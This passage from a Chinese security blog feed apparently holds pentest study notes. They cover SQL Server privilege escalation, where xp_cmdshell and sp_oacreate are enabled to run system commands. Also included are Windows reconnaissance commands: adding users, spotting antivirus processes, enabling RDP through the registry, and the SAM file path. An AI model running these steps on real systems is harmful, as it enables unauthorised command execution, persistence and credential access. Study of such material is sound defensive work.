winmgmt</span><br></pre></td></tr></table></figure><p>重启服务就ok。</p><h3 id="2-SQL-server提权-1433"><a href="#2-SQL-server提权-1433" class="headerlink" title="2.SQL server提权:1433"></a>2.SQL server提权:1433</h3><p>根据存储过程sa权限来提权</p><h4 id="1-xp-cmdshell-sqlserver-内置的一个命令，-05之后的的需要手动开启"><a href="#1-xp-cmdshell-sqlserver-内置的一个命令，-05之后的的需要手动开启" class="headerlink" title="1.xp_cmdshell(sqlserver 内置的一个命令， 05之后的的需要手动开启)"></a>1.xp_cmdshell(sqlserver 内置的一个命令， 05之后的的需要手动开启)</h4><p>sql server 各版本对应的权限   2008：network权限；2005 system权限</p><p> 开启xp_cmdshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;，1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;，1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>关闭xp_cmdshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; reconfigure;</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure;</span><br></pre></td></tr></table></figure><p>数据库执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;命令或者二进制文件&#x27; ;</span><br></pre></td></tr></table></figure><h4 id="2-sp-OACreate，没有回显，需要到最后的语句中找文件"><a href="#2-sp-OACreate，没有回显，需要到最后的语句中找文件" class="headerlink" title="2.sp_OACreate，没有回显，需要到最后的语句中找文件"></a>2.sp_OACreate，没有回显，需要到最后的语句中找文件</h4><p> sp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件还能配合sp_oamethod来写文件执行cmd，默认无回显</p><p>需要手动开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options &#x27;，1;</span><br><span class="line"></span><br><span class="line">ECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures &#x27;，1;</span><br><span class="line"></span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#x27;show advanced options &#x27;,0;</span><br></pre></td></tr></table></figure><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;，@shell output exec sp_oamethod @shell, &#x27;run&#x27; ,null, &#x27;c: \windows\system32\cmd.exe /c whoami &gt;C:\who.txt&#x27;/</span><br></pre></td></tr></table></figure><p>最后的回显在C:\who.txt中</p><h4 id="3-暂时不知道啥名-也没有回显"><a href="#3-暂时不知道啥名-也没有回显" class="headerlink" title="3.暂时不知道啥名~也没有回显"></a>3.暂时不知道啥名~也没有回显</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @o int;</span><br><span class="line"></span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out;</span><br><span class="line"></span><br><span class="line">exec sp_oamethod @o，&#x27;ShellExecute &#x27;,null，&#x27;cmd.exe&quot; , &#x27; cmd /c net user &gt;c:\test.txt&#x27; , &#x27;c:\windows\system32&#x27; &#x27; &#x27;;</span><br></pre></td></tr></table></figure><p>回显在c:\test.txt中</p><p>参考：<a href="https://lengjibo.github.io/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://lengjibo.github.io/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</a></p><p><a href="https://422926799.github.io/posts/34b370c6.html">https://422926799.github.io/posts/34b370c6.html</a></p><p><a href="https://www.cnblogs.com/swyft/articles/5580342.html">https://www.cnblogs.com/swyft/articles/5580342.html</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/11031238.html">https://www.cnblogs.com/bmjoker/p/11031238.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypassuac </tag>
            
            <tag> msf提权 </tag>
            
            <tag> 漏洞提权(Windows-exploit-suggester、msf) </tag>
            
            <tag> 命令提权(at、sc) </tag>
            
            <tag> 配置错误导致提权(不带引号的的路径服务、弱文件夹权限、不安全的服务权限、注册表权限不足、AlwaysInstallElevated、Unattended Installs) </tag>
            
            <tag> powerup工具提权 </tag>
            
            <tag> dll劫持 </tag>
            
            <tag> dll注入 </tag>
            
            <tag> mysql提权(sqlmap、udf、启动项、mof) </tag>
            
            <tag> sql server提权(xp_cmdshell、sp_oacreate、sp_oamethod) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows基础</title>
      <link href="/2020/10/01/windows%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/10/01/windows%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>如题</p><span id="more"></span><h2 id="1-用户权限划分"><a href="#1-用户权限划分" class="headerlink" title="1.用户权限划分"></a>1.用户权限划分</h2><p>​system（最高）</p><p>​Administrator管理员权限</p><p>​User普通用户权限</p><h2 id="2-权限继承"><a href="#2-权限继承" class="headerlink" title="2.权限继承"></a>2.权限继承</h2><p>​例如管理员启动ftp，ftp获得管理员权限</p><h2 id="3-默认用户"><a href="#3-默认用户" class="headerlink" title="3.默认用户"></a>3.默认用户</h2><p>​Administrator</p><p>​Guest 来宾用户</p><p>​net user 查看系统所有用户</p><p>​上传cmd执行：<code>url/cmd.exe /c net user</code> (&#x2F;c作用:close，执行完cmd后自动关闭)</p><h2 id="4-用户组"><a href="#4-用户组" class="headerlink" title="4.用户组"></a>4.用户组</h2><h3 id="1-用户组的特性"><a href="#1-用户组的特性" class="headerlink" title="1.用户组的特性"></a>1.用户组的特性</h3><ol><li><p>组是一些用户的集合</p></li><li><p>为一个组添加权限，组内成员自动获得对应权限</p></li><li><p>用户加入组后，自动获得组的所有权限</p></li></ol><h3 id="2-特殊的组"><a href="#2-特殊的组" class="headerlink" title="2.特殊的组"></a>2.特殊的组</h3><pre><code> ​1.administrators组 ​2.guests组 ​3.users组 ​4.power users组：Windows内置组 ​5.remote desktop组：内置组，远程连接权限（administrator默认自带该权限）  ​6.print users组：打印机</code></pre><p>​<code>net localgroup</code> 查看当前系统所有的组</p><p>SID:安全标识符，创建组或者用户时分配的唯一标识符 查看sid：<code>whoami /user</code></p><h2 id="5-常用的命令"><a href="#5-常用的命令" class="headerlink" title="5.常用的命令"></a>5.常用的命令</h2><h3 id="1-用户命令"><a href="#1-用户命令" class="headerlink" title="1.用户命令"></a>1.用户命令</h3><p>​<code>whoami</code> ：查看当前用户权限 (最高system权限显示： <code>nt authoritysystem</code>）</p><p>​<code>whoami /user</code>：检查当前shell权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名               SID</span><br><span class="line">==================== =============================================</span><br><span class="line">xx S-1-5-21-xxxxxxxxxx-xxxxxxxxx-xxxxxxxxxx-1001</span><br></pre></td></tr></table></figure><p>​SID：安全标识符，创建组或者用户时分配的唯一标识符 </p><p>​ S：SID标识符，将数字标识为一个SID</p><p>​  R：Revision（修订），Windows生成的所有SID都使用修订级别 1.</p><p>​  IA：颁发机构。在Widnwos中，几乎所有SID都指定NT机构作为颁发机构，ID编号为5，代表 已知组和账户的SID例外。</p><pre><code>                   SA：代一个子机构。SA指定特殊的组或职能。例如，21表明SID由一个域控制器或者一台单机颁发。随后的一长串数字（xxxxxxxxxx-xxxxxxxxx-xxxxxxxxxx）就是颁发SID的那个域或机器的SA。</code></pre><p>​RID：指派给用户、计算机和组的RID从1000开始。500-999的RID被专门保留起来、表示在每 个Windows计算机和域中通用的账户和组，它们称为“已知RID”有些已知RID会附加到一个 域SID上，从而构成一个惟一的标识符。另一些则附加到BuiltinSID(S-1-5-32)上，指出它们  是可能具有特权的Builtin账户，特权要么是硬编码到操作系统中的，要么是在安全数据库中指派的。</p><p>​<code>net user 用户名</code>：查看具体用户的信息</p><p>​<code>net user 用户名 密码 /add</code>：添加一个指定的用户（需要管理员权限，注意密码复杂度）</p><p>​<code>query user</code>：查看在线用户</p><p>​<code>hostname</code>：查看主机名</p><p>​<code>cmdkey /l</code>：远程桌面连接历史记录</p><p>​<code>net localgroup administrators</code>：查看本机管理员</p><h3 id="2-用户组命令"><a href="#2-用户组命令" class="headerlink" title="2.用户组命令"></a>2.用户组命令</h3><p>​<code>net loalgroup 组名 /add</code>：添加一个用户组</p><p>​<code>net loalgroup 组名</code>：查看组内成员</p><p>​<code>net localgroup 用户组 用户名 /del</code>：删除组内指定用户</p><p>​    <code>net localgroup 用户组 用户名 /add</code>：将指定用户添加指定组</p><h3 id="3-进程命令"><a href="#3-进程命令" class="headerlink" title="3.进程命令"></a>3.进程命令</h3><p>​<code>tasklist</code>：查看进程</p><p>​<code>tasklist /svc</code>：显示进程名字、PID及其服务</p><p>​相关进程名字：360：<code>ZhuDongFangYu.exe</code>  </p><p>​安全狗：<code>SafeDogUpdateCenter.exe</code></p><p>​远程桌面：<code>teamservice.exe</code></p><p>​<code>tasklist /svc &gt; 文件名字</code>：将进程信息输入到对应的文件中</p><p>​<code>taskkill</code>：杀死进程</p><p>​<code>taskkill /f /im 进程名</code>：杀死对应进程，&#x2F;f：强制执行</p><h3 id="4-网络命令"><a href="#4-网络命令" class="headerlink" title="4.网络命令"></a>4.网络命令</h3><p>​<code>Ipconfig /all</code>：查看本地网络详细信息</p><p>​<code>netstat  -ano</code>：查看本地网络信息</p><p>​<code>netstat -ano | findstr &quot;端口号&quot;</code>：查看对应端口是否开启</p><p>​通过修改注册表开启3389：</p><p>​<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 000000000 /f</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\administrator.MCITP&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Termi</span><br><span class="line">nal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 000000000 /f</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Users\administrator.MCITP&gt;</span><br></pre></td></tr></table></figure><p>​ 关闭3389：</p><p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\administrator.MCITP&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Termi</span><br><span class="line">nal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Users\administrator.MCITP&gt;</span><br></pre></td></tr></table></figure><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3><p>​<code>ver</code>：查看系统版本</p><p>​<code>Windows 5.1-win 2003/xp </code></p><p>​<code>Windows 5.2-win xp</code> </p><p>​<code> Windows 6.1-win 7/2008</code> </p><p>​<code>Windows 6.2-win 8/2012</code></p><p>​<code>Windows 10-win 10</code></p><p>​<code>systeminfo</code>：查看Windows详细信息</p><p>​<code>wmic os get caption,csdversion,osarchitecture,version</code>：查看系统版本信息</p><p>​<code>wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</code>：查看当前系统杀软信息</p><p>​  <code>wmic product get name,version</code>：查看当前系统安装的应用以及版本信息</p><p>​</p><h2 id="6-Windows认证及密码"><a href="#6-Windows认证及密码" class="headerlink" title="6.Windows认证及密码"></a>6.Windows认证及密码</h2><p>​密码存储文件sam：c:&#x2F;windows&#x2F;system32&#x2F;config&#x2F;SAM</p><p>​密码加密类型</p><p>​ntlm hash：明文-16h-Unicode-md4-16h</p><p>​ntml v1     ntml v2</p><p>​lm hash(已被淘汰)</p><p>​登录过程</p><p>​Winlogin.exe-&gt;lsass.exe-&gt;认证</p><p>​win版本&amp;&amp;密码版本</p><p>​Win2000-lm hash、win2003-ntlm hash、win7-ntlm hash v2</p><h2 id="7-Windows-UAC（win7以上）"><a href="#7-Windows-UAC（win7以上）" class="headerlink" title="7.Windows UAC（win7以上）"></a>7.Windows UAC（win7以上）</h2><p>​认证控制（以管理员权限运行触发）</p><p><img src="data:image/png;base64,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